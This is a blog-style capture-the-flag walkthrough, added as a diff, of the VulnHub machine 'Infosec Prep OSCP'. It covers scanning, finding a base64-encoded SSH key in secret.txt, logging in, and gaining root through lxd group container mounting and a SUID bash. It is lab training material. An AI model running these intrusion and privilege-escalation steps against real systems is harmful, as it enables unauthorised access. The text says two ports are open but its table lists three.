@@ -1,0 +1,135 @@
+<ul class="large-only" id="markdown-toc">
+  <li><a href="#machine-summary" id="markdown-toc-machine-summary">Machine Summary</a></li>
+  <li><a href="#nmap-scan" id="markdown-toc-nmap-scan">Nmap Scan</a></li>
+  <li><a href="#enumeration-on-port-80" id="markdown-toc-enumeration-on-port-80">Enumeration on Port 80</a></li>
+  <li><a href="#acquiring-user-shell" id="markdown-toc-acquiring-user-shell">Acquiring User Shell</a></li>
+  <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a></li>
+  <li><a href="#privilege-escalation-through-exploiting-lxd-group" id="markdown-toc-privilege-escalation-through-exploiting-lxd-group">Privilege Escalation through Exploiting lxd group</a></li>
+  <li><a href="#exploiting-the-misconfigured-suid---bash" id="markdown-toc-exploiting-the-misconfigured-suid---bash">Exploiting the misconfigured SUID - bash</a></li>
+</ul>
+
+<h2 id="machine-summary">Machine Summary</h2>
+<p>Machine has a web application running, upon enumerating the directories /secret.txt contains a SSH Private key which is encoded in base64. After decryption, we can login as user <strong>oscp</strong> with the SSH Private key. we can esclate the privileges to root in two ways 1. Exploiting the lxd group 2. Exploiting the SUID - Bash</p>
+
+<h2 id="nmap-scan">Nmap Scan</h2>
+<p>As the golden rule i started with nmap scan</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 192.168.0.101
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/1.png" alt="" />
+It has two ports open</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Port</th>
+      <th style="text-align: left">Service</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">ssh</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">http</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">33060</td>
+      <td style="text-align: left">mysqlx</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="enumeration-on-port-80">Enumeration on Port 80</h2>
+
+<p>I started to enumerate on the site, it was a wordpress site so i ran a wpscan on it but nothing poped up. I manually enumerated on the site but i ended up with no usefull information for enumeration
+<img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/2.png" alt="" /></p>
+
+<p>I ran gobuster on the site to enumerate the files and directories</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.0.101/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php,html,txt,conf
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/3.png" alt="" /></p>
+
+<p>secret.txt seems to be interesting, I opened it on the browser</p>
+
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/5.png" alt="" /></p>
+
+<h2 id="acquiring-user-shell">Acquiring User Shell</h2>
+<p>It was encoded on base64 so i decoded it, viewing that it was a SSH private key</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Base64_Hash"</span> |base64 <span class="nt">-d</span> <span class="o">&gt;&gt;</span> id_rsa
+</code></pre></div></div>
+<p>We need some usernames to login through ssh using the private key so i tried guessing username and username <strong><em>oscp</em></strong> worked.
+We also need to add permissions to the private key</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 id_rsa
+</code></pre></div></div>
+<p>I logged in onto the machine using the private key for the user oscp</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa oscp@192.168.0.101
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/6.png" alt="" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>I enumerated the machine with current privilege as oscp, found two things that could grant us root shell</p>
+
+<ol>
+  <li>User is part of lxd group</li>
+  <li>Suid was configured for /usr/bin/bash</li>
+</ol>
+
+<p>By these two ways, we can proceed to root.</p>
+
+<h2 id="privilege-escalation-through-exploiting-lxd-group">Privilege Escalation through Exploiting lxd group</h2>
+
+<p><strong>LXC</strong> —short for “Linux containers”, is a solution for virtualizing software at the operating system level within the Linux kernel.</p>
+
+<p><strong>LXD</strong> is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the  local lxd group.
+ie. a low privilege user can create a bridge between sockets on the host and its containers. when bridging from an existing socket on the host to a new socket in a container, it makes the connection with the credentials of the LXD service. so when user speaks to the container, the messages (command) and it lands on the container with root privileges (commands are executed with the root)</p>
+
+<p>Executing lxc directly didn’t work so i tried executing it with the full path of the binary file ie. /snap/bin/lxc</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/snap/bin/lxc
+</code></pre></div></div>
+<p>First i created a storage pool</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/snap/bin/lxd init
+</code></pre></div></div>
+<p>I moved on with the default settings, now we need to create a container called test</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/snap/bin/lxc init ubuntu:18.04 <span class="nb">test</span> <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
+</code></pre></div></div>
+<p>We configure that container such that all the files and folders of the host is copied or present in /mnt/root directory</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/snap/bin/lxc config device add <span class="nb">test </span>whatever disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</code></pre></div></div>
+<p>Now we need to start the container called test</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/snap/bin/lxc start <span class="nb">test</span>
+</code></pre></div></div>
+<p>We execute the container</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/snap/bin/lxc exec test bash
+</code></pre></div></div>
+<p>Now we go into the directory <strong>/mnt/root/root</strong> to get the flag.txt</p>
+
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/7.png" alt="" /></p>
+
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/8.png" alt="" /></p>
+
+<p class="note" title="Attention"><strong>This exploit methodolgy will only work when the target machine has access to internet</strong></p>
+
+<h2 id="exploiting-the-misconfigured-suid---bash">Exploiting the misconfigured SUID - bash</h2>
+
+<p><strong>SUID</strong> - SUID is nothing but a special permission bit available in Linux, that achieves this with a lot of ease. If you are the owner of an executable file, with the help of SUID permission set, other users will be running the executable with your  permission and not theirs.</p>
+
+<p>We can list the binaries with SUID permissions using the command below</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/9.png" alt="" />
+<img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/10.png" alt="" /></p>
+
+<p>Bash was the juicy binary. we can exploit it to get the root privilege</p>
+
+<p><a href="https://gtfobins.github.io/#+suid"><strong>GetFoBins</strong></a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-p</span>
+</code></pre></div></div>
+<p>This granted us the shell with root privilege</p>
+
+<p><img src="https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/11.png" alt="" /></p>
+
+<p>Happy Hacking !</p>
